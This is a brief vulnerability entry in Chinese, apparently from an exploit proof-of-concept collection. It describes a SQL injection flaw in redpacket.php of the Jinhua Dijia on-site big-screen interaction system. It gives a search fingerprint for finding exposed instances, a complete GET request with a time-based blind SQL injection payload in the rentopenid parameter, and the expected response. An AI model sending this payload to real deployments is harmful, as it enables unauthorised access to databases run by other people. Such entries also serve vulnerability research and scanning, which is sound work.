# 金华迪加现场大屏互动系统redpacket.php存在SQL注入漏洞

金华迪加现场大屏互动系统 ｜ SQL注入 ｜ —
- **指纹**：`body="/wall/themes/meepo/assets/images/defaultbg.jpg"`
- **请求**：`GET /mobile/redpacket.php?rentopenid=1"+AND+(SELECT+3710+FROM+(SELECT(SLEEP(5)))eMwG)--+yTBg HTTP/1.1`
- **响应特征**：200